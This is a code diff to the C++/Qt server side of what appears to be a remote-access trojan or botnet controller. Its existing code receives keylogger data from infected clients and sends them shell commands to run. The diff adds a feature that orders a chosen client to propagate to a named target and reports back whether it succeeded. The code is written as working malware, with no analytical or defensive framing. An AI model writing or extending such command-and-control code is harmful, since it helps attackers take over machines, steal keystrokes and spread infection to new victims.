@@ -204,6 +204,20 @@ void Server::processPacketBuffer(ClientContext& client) {
         } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_DATA)) {
             emit keylogReceived(QString::fromStdString(client.socket.getIp()), 
                                QString::fromStdString(sanitizeOutput(payload_str, 12, payload_str.size()-12)));
+        } else if (opcode == static_cast<uint16_t>(Opcode::PROPAGATE_RES)) {
+            // Payload: [U8 success][U16 output_len][output...]
+            if (payload.size() >= 3) {
+                bool success = payload[0] != 0;
+                uint16_t out_len = (static_cast<uint16_t>(payload[1]) << 8) | payload[2];
+                std::string output = (3 + static_cast<size_t>(out_len) <= payload.size())
+                    ? sanitizeOutput(payload_str, 3, out_len)
+                    : std::string();
+                QString result = QString("%1 | %2")
+                    .arg(success ? "SUCCESS" : "FAILED")
+                    .arg(QString::fromStdString(output));
+                emit propagationResultReceived(
+                    QString::fromStdString(client.socket.getIp()), result);
+            }
         }
 
         // Remove processed bytes from the buffer (wire size, not decrypted size)
@@ -236,6 +250,19 @@ void Server::sendShellCommand(const QString& ip, const QString& cmd) {
             payload.append(cmd_str);
             
             Packet p(static_cast<uint16_t>(Opcode::CMD_EXEC), payload);
+            client.socket.sendData(p.serialize());
+            break;
+        }
+    }
+}
+
+void Server::sendPropagationCommand(const QString& ip, uint8_t cmd, const QString& target) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            std::string payload;
+            payload.push_back(static_cast<char>(cmd));
+            payload.append(target.toStdString());
+            Packet p(static_cast<uint16_t>(Opcode::PROPAGATE), payload);
             client.socket.sendData(p.serialize());
             break;
         }
